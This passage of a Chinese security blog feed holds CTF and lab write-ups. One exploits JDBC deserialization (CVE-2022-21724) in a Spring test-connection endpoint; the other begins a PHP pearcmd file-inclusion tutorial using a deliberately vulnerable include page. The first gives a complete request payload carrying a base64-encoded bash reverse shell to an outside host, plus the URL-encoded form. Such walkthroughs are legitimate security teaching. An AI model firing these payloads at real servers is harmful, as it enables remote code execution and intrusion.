<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>42.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>导入maven项目，会有警告</p><p><img src="/2023/10/22/0xGameCTF2023/image-20231109141850781.png" alt="image-20231109141850781"></p><p>其中可以找到几个关键的cve，最后查到是CVE-2022-21724</p><p>可以去看我的<strong>MYSQL_JDBC反序列化解析</strong>，里面具体介绍了怎么利用漏洞</p><p>漏洞注入的关键代码在IndexController.java,有路由testConnection，driver（驱动），url（数据库的地址），username（数据库用户名），password（数据库用户名密码）这四个参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.testconnection;<br><br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/testConnection&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testConnection</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;driver&quot;)</span> String driver, <span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url, <span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username, <span class="hljs-meta">@RequestParam(&quot;password&quot;)</span> String password)</span> &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         Class.forName(driver);<br>         DriverManager.getConnection(url, username, password);<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>         <span class="hljs-keyword">return</span> var6.getMessage();<br>      &#125;<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其中由于url参数的可控给我们提供了代码执行的条件</p><p>接下来我们需要准备一个恶意的数据库然后去连接，命令执行</p><p>这边介绍一个利用的工具：<a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p><p>这个工具可以生成payload并且创建一个恶意的数据库让用户去连接然后去命令执行</p><p><strong>注意：</strong>用docker搭建恶意的数据库的时候要确保docker的版本高，低的docker版本无法搭建</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">docker build -t fake-mysql-<span class="hljs-keyword">server</span> .<br>docker run -p [自己选]:<span class="hljs-number">3306</span> -d fake-mysql-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/22/0xGameCTF2023/1699539734004.png" alt="1699539734004"></p><p>选cc3.1</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">jdbc:</span>mysql://<span class="hljs-number">111.111</span><span class="hljs-number">.111</span><span class="hljs-number">.111</span>:<span class="hljs-number">1234</span>/test?autoDeserialize=true&amp;queryInterceptors=<span class="hljs-keyword">com</span>.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31<br></code></pre></td></tr></table></figure><p>需要修改一下</p><p>因为题目给的代码是 <code>DriverManager.getConnection(url, username, password);</code>, 即会单独传入一个 username 参数, 因此 url 中的 username 会被后面的 username 给覆盖</p><p>网上的部分利用工具会通过 username 来区分不同的 payload, 所以得注意 username 要单独传, 不然写在 url 里面就被覆盖了</p><p>其次, 因为 jdbc url 本身也符合 url 的规范, 所以在传 url 参数的时候, 需要把 url 本身全部进行 url 编码, 防止服务器错把 autoDeserialize, queryInterceptors 这些参数当成是一个 http get 参数, 而不是 jdbc url 里面的参数</p><p>最后依然是 <strong>Runtime.exec 命令编码</strong>的问题这个也可以去看我的相关博客</p><p>修改好的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?driver=com.mysql.cj.jdbc.Driver&amp;url=jdbc:mysql://host.docker.internal:3308/test?autoDeserialize=<span class="hljs-literal">true</span>&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_CC31_bash -c &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;<span class="hljs-built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;&amp;password=123<br></code></pre></td></tr></table></figure><p>之后编码用get方法上传</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?driver<span class="hljs-operator">=</span>com.mysql.cj.jdbc.Driver&amp;url<span class="hljs-operator">=</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%63</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%33</span><span class="hljs-variable">%30</span><span class="hljs-variable">%38</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%44</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%69</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%65</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%26</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%79</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>d<span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%53</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%53</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%44</span><span class="hljs-variable">%69</span><span class="hljs-variable">%66</span><span class="hljs-variable">%66</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span>&amp;username<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%43</span><span class="hljs-variable">%43</span><span class="hljs-variable">%33</span><span class="hljs-variable">%31</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%59</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%46</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%61</span><span class="hljs-variable">%43</span><span class="hljs-variable">%41</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%53</span><span class="hljs-variable">%41</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%4</span>a<span class="hljs-variable">%69</span><span class="hljs-variable">%41</span><span class="hljs-variable">%76</span><span class="hljs-variable">%5</span>a<span class="hljs-variable">%47</span><span class="hljs-variable">%56</span><span class="hljs-variable">%32</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%33</span><span class="hljs-variable">%52</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%63</span><span class="hljs-variable">%43</span><span class="hljs-variable">%39</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%62</span><span class="hljs-variable">%33</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%30</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%52</span><span class="hljs-variable">%76</span><span class="hljs-variable">%59</span><span class="hljs-variable">%32</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%63</span><span class="hljs-variable">%69</span><span class="hljs-variable">%35</span><span class="hljs-variable">%70</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%52</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%35</span><span class="hljs-variable">%68</span><span class="hljs-variable">%62</span><span class="hljs-variable">%43</span><span class="hljs-variable">%38</span><span class="hljs-variable">%30</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%44</span><span class="hljs-variable">%51</span><span class="hljs-variable">%30</span><span class="hljs-variable">%49</span><span class="hljs-variable">%44</span><span class="hljs-variable">%41</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%4</span>a<span class="hljs-variable">%6</span>a<span class="hljs-variable">%45</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%7</span>d&amp;password<span class="hljs-operator">=</span><span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>查看env即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF-wp-Web&amp;Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于利用pearcmd进行文件包含的一些总结</title>
    <link href="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
    <url>/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>PHP裸文件包含</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>安装了pear扩展</p><p>php开启了<code>register_argc_argv</code>选项</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>php的pear扩展是一个命令行扩展管理工具，默认的安装路径在<code>/usr/local/lib/php/pearcmd.php</code>，在命令行下可以用<code>pear</code>或<code>php /usr/local/lib/php/pearcmd.php</code>运行，虽然不是在web的目录下，但是如果存在文件包含漏洞，我们就可以运行这个命令行工具</p><p>我们再来看<code>register_argc_argv</code>选项，在这个选项字段如果选了<code>ON</code>的话，URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，无论后面的内容是否有等号。</p><p>pear会在<code>pearcmd.php</code>获取命令行参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">setFrontendType</span>(<span class="hljs-string">&#x27;CLI&#x27;</span>);<br><span class="hljs-variable">$all_commands</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getCommands</span>();<br><br><span class="hljs-variable">$argv</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">readPHPArgv</span>();<br><span class="hljs-comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">php_sapi_name</span>() != <span class="hljs-string">&#x27;cli&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]) &amp;&amp; <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;--&#x27;</span>) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-variable">$argv</span> = <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-variable">$argv</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>而pear获取命令行参数的函数<code>Consoles/Getopt.php-&gt;readPHPArgv()</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readPHPArgv</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$argv</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$argv</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (!@<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>])) &#123;<br>                <span class="hljs-keyword">if</span> (!@<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="hljs-string">&#x27;argv&#x27;</span>])) &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;<br>                    <span class="hljs-keyword">return</span> PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<span class="hljs-string">&quot;Console_Getopt: &quot;</span> . <span class="hljs-variable">$msg</span>);<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="hljs-string">&#x27;argv&#x27;</span>];<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$argv</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>会先尝试<code>$argv</code>变量（这个变量储存在命令行模式下运行php脚本时传入的参数），然后再尝试<code>$_SERVER[&#39;argv&#39;]</code>变量，<code>$_SERVER[&#39;argv&#39;]</code>为我们可控的变量，这样，在文件包含的场景下，我们就可以运行pear命令行工具并用GET请求参数控制pear的命令行参数了。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>接下来就是寻找可以利用的命令了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Commands:<br>build                  Build an Extension <span class="hljs-keyword">From</span> C Source<br>bundle                 Unpacks a Pecl Package<br>channel-<span class="hljs-built_in">add</span>            <span class="hljs-built_in">Add</span> a Channel<br>channel-alias          Specify an alias <span class="hljs-keyword">to</span> a channel name<br>channel-delete         <span class="hljs-built_in">Remove</span> a Channel <span class="hljs-keyword">From</span> the List<br>channel-discover       Initialize a Channel <span class="hljs-keyword">from</span> its<span class="hljs-built_in"> server</span><br><span class="hljs-built_in"></span>channel-<span class="hljs-built_in">info</span>           Retrieve Information on a Channel<br>channel-login          Connects <span class="hljs-keyword">and</span> authenticates <span class="hljs-keyword">to</span> remote channel<span class="hljs-built_in"> server</span><br><span class="hljs-built_in"></span>channel-logout         Logs out <span class="hljs-keyword">from</span> the remote channel<span class="hljs-built_in"> server</span><br><span class="hljs-built_in"></span>channel-update         Update an Existing Channel<br>clear-cache            Clear Web Services Cache<br>config-create          Create a<span class="hljs-built_in"> Default </span>configuration file<br>config-<span class="hljs-built_in">get</span>             Show One Setting<br>config-help            Show Information About Setting<br>config-<span class="hljs-built_in">set</span>             Change Setting<br>config-show            Show All<span class="hljs-built_in"> Settings</span><br><span class="hljs-built_in"></span>convert                Convert a package.xml 1.0 <span class="hljs-keyword">to</span> package.xml 2.0 format<br>cvsdiff                <span class="hljs-built_in">Run</span> a <span class="hljs-string">&quot;cvs diff&quot;</span> <span class="hljs-keyword">for</span> all files <span class="hljs-keyword">in</span> a package<br>cvstag                 <span class="hljs-built_in">Set</span> CVS Release Tag<br>download               Download Package<br>download-all           Downloads each available package <span class="hljs-keyword">from</span> the<span class="hljs-built_in"> default </span>channel<br><span class="hljs-built_in">info</span>                   Display information about a package<br>install                Install Package<br>list                   List Installed Packages <span class="hljs-keyword">In</span> The<span class="hljs-built_in"> Default </span>Channel<br>list-all               List All Packages<br>list-channels          List Available Channels<br>list-files             List Files <span class="hljs-keyword">In</span> Installed Package<br>list-upgrades          List Available Upgrades<br>login                  Connects <span class="hljs-keyword">and</span> authenticates <span class="hljs-keyword">to</span> remote<span class="hljs-built_in"> server </span>[Deprecated <span class="hljs-keyword">in</span> favor of channel-login]<br>logout                 Logs out <span class="hljs-keyword">from</span> the remote<span class="hljs-built_in"> server </span>[Deprecated <span class="hljs-keyword">in</span> favor of channel-logout]<br>makerpm                Builds an RPM spec file <span class="hljs-keyword">from</span> a PEAR package<br>package                Build Package<br>package-dependencies   Show package dependencies<br>package-validate       Validate Package Consistency<br>pickle                 Build PECL Package<br>remote-<span class="hljs-built_in">info</span>            Information About Remote Packages<br>remote-list            List Remote Packages<br>run-scripts            <span class="hljs-built_in">Run</span> Post-Install Scripts bundled with a package<br>run-tests              <span class="hljs-built_in">Run</span> Regression Tests<br>search                 Search remote package database<br>shell-test             Shell<span class="hljs-built_in"> Script </span>Test<br>sign                   Sign a package distribution file<br>svntag                 <span class="hljs-built_in">Set</span> SVN Release Tag<br>uninstall              Un-install Package<br>update-channels        Update the Channel List<span class="hljs-built_in"></span><br><span class="hljs-built_in">upgrade </span>              <span class="hljs-built_in"> Upgrade </span>Package<br>upgrade-all           <span class="hljs-built_in"> Upgrade </span>All Packages [Deprecated <span class="hljs-keyword">in</span> favor of calling<span class="hljs-built_in"> upgrade </span>with <span class="hljs-literal">no</span> parameters]<br>Usage: pear [options] command [command-options] &lt;parameters&gt;<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help options&quot;</span> <span class="hljs-keyword">to</span> list all options.<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help shortcuts&quot;</span> <span class="hljs-keyword">to</span> list all command shortcuts.<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help version&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;pear version&quot;</span> <span class="hljs-keyword">to</span> list version information.<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help &lt;command&gt;&quot;</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> the help <span class="hljs-keyword">for</span> the specified command.<br></code></pre></td></tr></table></figure><p>现在介绍三种利用手法</p><p>为了试验这几种方法我用docker在本地搭建了一个文件包含环境，镜像是<code>php:7.4-apache</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h3><p>此方法来自于<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">p神博客</a></p><p>此命令的参数和用法如下</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">config-<span class="hljs-keyword">create</span>: must have <span class="hljs-number">2</span> parameters, root <span class="hljs-keyword">path</span> <span class="hljs-keyword">and</span> filename <span class="hljs-keyword">to</span> save <span class="hljs-keyword">as</span><br></code></pre></td></tr></table></figure><p>就是要我们输入两个参数，一个是绝对路径，还有保存配置文件的文件名</p><p>尝试一下使用以下这个命令看下效果</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">pear config-create <span class="hljs-string">/114514whatever</span> <span class="hljs-string">/tmp/test.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p1.jpg" alt="pearcmd_p1"></p><p>可以看见我们已经写入一个配置文件了，检查下内容</p><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p2.jpg" 